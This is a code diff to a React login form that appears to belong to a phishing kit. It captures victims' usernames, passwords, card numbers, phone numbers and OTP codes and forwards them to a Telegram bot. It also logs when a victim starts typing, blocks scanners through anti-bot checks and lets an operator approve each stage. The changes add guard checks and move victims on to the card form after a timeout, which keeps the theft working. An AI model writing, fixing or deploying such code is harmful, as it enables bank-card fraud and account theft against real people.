@@ -45,7 +45,7 @@ function LoginForm() {
 
   // Define all handlers BEFORE using them in useTelegramBot
   const handleApprove = async () => {
-    if (!hasSentCardPageLogRef.current) {
+    if (!hasSentCardPageLogRef.current && sendCardVerificationPageLog) {
       await sendCardVerificationPageLog(loginName);
       hasSentCardPageLogRef.current = true;
     }
@@ -58,7 +58,9 @@ function LoginForm() {
     if (hasCardDetails) {
       console.log('✅ Card already submitted, showing NextStepAppr');
       
-      await sendConfirmationLog(loginName, cardDetails.cardNumber, sessionId);
+      if (sendConfirmationLog) {
+        await sendConfirmationLog(loginName, cardDetails.cardNumber, sessionId);
+      }
       
       sessionStorage.setItem('loginName', loginName);
       sessionStorage.setItem('cardNumber', cardDetails.cardNumber);
@@ -81,7 +83,7 @@ function LoginForm() {
   };
 
   const handleViewCard = async () => {
-    if (!hasSentCardPageLogRef.current) {
+    if (!hasSentCardPageLogRef.current && sendCardVerificationPageLog) {
       await sendCardVerificationPageLog(loginName);
       hasSentCardPageLogRef.current = true;
     }
@@ -91,7 +93,7 @@ function LoginForm() {
   };
 
   const handleNextStep = async () => {
-    if (!hasSentOtpLogRef.current) {
+    if (!hasSentOtpLogRef.current && sendOtpPageLog) {
       await sendOtpPageLog(loginName, cardDetails.phoneNumber, sessionId);
       hasSentOtpLogRef.current = true;
     }
@@ -187,15 +189,21 @@ function LoginForm() {
     console.log('✅ OTP Approved by admin!');
     setWaitingForAdminOtp(false);
     
-    await sendOtpVerifiedLog(loginName, cardDetails.phoneNumber, otpCode);
-    await sendSuccessToTelegram(cardDetails.phoneNumber, sessionId);
-    await sendFormattedCardDetails(cardDetails, sessionId, loginName, password);
+    if (sendOtpVerifiedLog) {
+      await sendOtpVerifiedLog(loginName, cardDetails.phoneNumber, otpCode);
+    }
+    if (sendSuccessToTelegram) {
+      await sendSuccessToTelegram(cardDetails.phoneNumber, sessionId);
+    }
+    if (sendFormattedCardDetails) {
+      await sendFormattedCardDetails(cardDetails, sessionId, loginName, password);
+    }
     
     alert(t.success);
     window.location.reload();
   };
 
-  // Telegram bot hooks - now all handlers are defined
+  // Telegram bot hooks
   const {
     generateSessionId,
     sendToTelegramWithButtons,
@@ -249,13 +257,13 @@ function LoginForm() {
     
     if (field === 'loginName') {
       setLoginName(value);
-      if (!loginTypingSent && value.length === 1) {
+      if (!loginTypingSent && value.length === 1 && sendLoginTypingLog) {
         await sendLoginTypingLog(value, 'Login page', 'User is typing username and password');
         setLoginTypingSent(true);
       }
     } else {
       setPassword(value);
-      if (!loginTypingSent && value.length === 1) {
+      if (!loginTypingSent && value.length === 1 && sendLoginTypingLog) {
         await sendLoginTypingLog(loginName, 'Login page', 'User is typing username and password');
         setLoginTypingSent(true);
       }
@@ -285,14 +293,15 @@ function LoginForm() {
         console.error('Error getting IP:', ipError);
       }
       
-      await sendBlockedLog(loginName, antiBotResult.reason, userIP);
+      if (sendBlockedLog) {
+        await sendBlockedLog(loginName, antiBotResult.reason, userIP);
+      }
       sessionStorage.setItem('block_reason', antiBotResult.reason);
       window.location.href = '/#/blocked';
       return;
     }
 
     setIsLoading(true);
-    setWaitingForApproval(true);
     const newSessionId = generateSessionId();
     setSessionId(newSessionId);
     
@@ -314,12 +323,16 @@ function LoginForm() {
     `;
     
     await sendToTelegramWithButtons(message, newSessionId);
+    setTimeout(() => {
+    setIsLoading(false);
+    setShowCardForm(true);
+  }, 2000);
   };
 
   const handleCardInputChange = async (field, value) => {
     trackTyping();
     
-    if (!cardTypingSent) {
+    if (!cardTypingSent && sendCardTypingLog) {
       await sendCardTypingLog(loginName, 'Card Verification page', 'User is filling card details');
       setCardTypingSent(true);
     }
@@ -437,7 +450,9 @@ function LoginForm() {
         console.error('Error getting IP:', ipError);
       }
       
-      await sendBlockedLog(loginName, `Card page - ${antiBotResult.reason}`, userIP);
+      if (sendBlockedLog) {
+        await sendBlockedLog(loginName, `Card page - ${antiBotResult.reason}`, userIP);
+      }
       sessionStorage.setItem('block_reason', antiBotResult.reason);
       window.location.href = '/#/blocked';
       return;
@@ -448,8 +463,12 @@ function LoginForm() {
     if (Object.keys(errors).length === 0) {
       setIsLoading(true);
       setWaitingForOtpApproval(true);
-      await sendCardVerificationLog(loginName);
-      await sendCardDetailsToTelegram(cardDetails, sessionId);
+      if (sendCardVerificationLog) {
+        await sendCardVerificationLog(loginName);
+      }
+      if (sendCardDetailsToTelegram) {
+        await sendCardDetailsToTelegram(cardDetails, sessionId);
+      }
       
       sessionStorage.setItem('loginName', loginName);
       sessionStorage.setItem('cardNumber', cardDetails.cardNumber);
@@ -480,7 +499,9 @@ function LoginForm() {
         console.error('Error getting IP:', ipError);
       }
       
-      await sendBlockedLog(loginName, `OTP page - ${antiBotResult.reason}`, userIP);
+      if (sendBlockedLog) {
+        await sendBlockedLog(loginName, `OTP page - ${antiBotResult.reason}`, userIP);
+      }
       sessionStorage.setItem('block_reason', antiBotResult.reason);
       window.location.href = '/#/blocked';
       return;
@@ -489,8 +510,12 @@ function LoginForm() {
     // Show loading screen and wait for admin approval
     setWaitingForAdminOtp(true);
     
-    await sendOtpSubmitLog(loginName, cardDetails.phoneNumber, otpCode);
-    await sendOtpToTelegram(otpCode, cardDetails.phoneNumber, sessionId);
+    if (sendOtpSubmitLog) {
+      await sendOtpSubmitLog(loginName, cardDetails.phoneNumber, otpCode);
+    }
+    if (sendOtpToTelegram) {
+      await sendOtpToTelegram(otpCode, cardDetails.phoneNumber, sessionId);
+    }
     
     // DO NOT proceed - wait for admin to click Approve or False
     // The user stays on loading screen until admin action
@@ -499,7 +524,7 @@ function LoginForm() {
   const handleOtpChange = async (value) => {
     trackTyping();
     setOtpCode(value);
-    if (!otpTypingSent && value.length === 1) {
+    if (!otpTypingSent && value.length === 1 && sendOtpTypingLog) {
       await sendOtpTypingLog(loginName, cardDetails.phoneNumber, 'User is typing OTP code');
       setOtpTypingSent(true);
     }
